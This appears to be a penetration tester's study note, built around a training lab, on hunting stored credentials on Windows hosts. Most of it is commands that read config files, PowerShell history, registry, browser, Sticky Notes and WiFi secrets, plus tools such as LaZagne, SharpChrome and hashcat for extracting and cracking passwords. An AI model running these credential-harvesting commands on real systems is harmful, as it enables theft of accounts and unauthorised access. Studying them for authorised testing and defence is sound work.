---
tags: [privesc, windows, cred-access]
aliases: [Credential Hunting]
---

Credentials may lead directly to local admin access.

# Application Configuration Files

Applications often store passwords in cleartext config files. 
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

# Dictionary Files

Sensitive Information may be entered in an dictionary file so that whatever text parser an application uses does not underline any words it doesn't recognize.

```shell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

# Unattended Installation Files

Might define auto-logon settings or additional accounts to be created as part of the installation. Passwords are stored in plaintext or base64.

# Powershell History

Starting with PS 5.0 in Windows 10, the command history is 
`C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Co`

We can also confirm the location of this file with
```powershell
(Get-PSReadLineOption).HistorySavePath

# read this file
gc (Get-PSReadLineOption).HistorySavePath

# one-liner to retrieve the contents the we can access as our user
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

# Powershell Credentials

Often used for scripting and automation tasks. The credentials are protected using DPAPI, which means they can only be decrypted by the same user on the same computer.


```powershell
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password

```


# Other Files

```shell
# search file contents for string
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

findstr /si password *.xml *.ini *.txt *.config

findstr /spin "password" *.*

# powershell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# file extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

where /R C:\ *.config

# powershell
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore 
```

When all else fails, we can run LaZagne tool in an attempt to retrieve credential from all over the system.

```shell
.\lazagne.exe -h

# running all modules
.\lazagne.exe all 
```

We can also sue the SessionGopher tool to extract credentials from PuTTY, WinSCP, FileZilla, etc. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined host, and decrypts session information it can find.

```powershell
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

## StickyNotes Passwords

Sticky notes are located in `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`. 

The files are stored as SQLite files. We want to copy the three `plum.sqlite*` files onto our system and open them with a DB Browser.

It is also possible to view these via Powershell
```powershell
Set-ExecutionPolicy Bypass -Scope Process

# 
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# we can also just run strings on the binary
strings plum.sqlite-wal
```

## CmdKey

cmdkey command can be used  to create, list, and delete stored usernames and passwords. These are usually used for terminal services to connect to a remote host without needing to enter a password. 

```shell
cmdkey /list

# run commands as another user
runas /savecred /user:inlanefreight\bob "COMMAND HERE"
```

## Browser Credentials

Users often store credentials in their browseirs.

```shell
.\SharpChrome.exe logins /unprotect
```

> Credential collection from Chromium-based browsers generated events that can easily be logged.

## Password Managers

Some password managers are stored locally on the host. If we find a `.kdbx` file on a server, we are dealing with a KeePass database. These are often protected via a master password, to gain access we will need to crack the hash.

```shell
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx 

# KeePass cracking
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt
```

## Email

We can search the user's email fro terms such as "pass", "creds", etc. using the [MailSniper](https://github.com/dafthack/MailSniper) tool.

# Registry

Certain programs can result in clear-text passwords stored in the registry.

# Windows AutoLogon

Feature that allows a user to configure their Windows operating system to automatically log on to a specific user account. The username and password are stored the registry in clear-text. Can be found in the following directory.

```shell
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

The following registry keys may be set.
- `AdminAutoLogon` - Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled.
- `DefaultUserName` - Holds the value of the username of the account that will automatically log on.
- `DefaultPassword` - Holds the value of the password for the user account specified previously.

We can also enumerate these via the shell
```shell
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## PuTTY

When the session is saved the credentials are stored in the registry in clear text.

```
Computer\HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>
```

The access control for this specific registry key are tied to the user account that configured and saved the session. We need to be logged in as that user and search the hive. If we had admin we could just find it in `HKEY_USERS`.

```shell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# look at the discovered session
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

# Wifi Passwords

If we obtain local admin access to a machine with a wireless card.
```shell
# list out wireless networks
netsh wlan show profile

# retrieve the Psk
netsh wlan show profile ilfreight_corp key=clear
```

## Related

- [[user-interaction]]
- [[password-spraying]]
- [[pillaging]]
- [[enumerating-security-control|Enumerating Security Controls]]

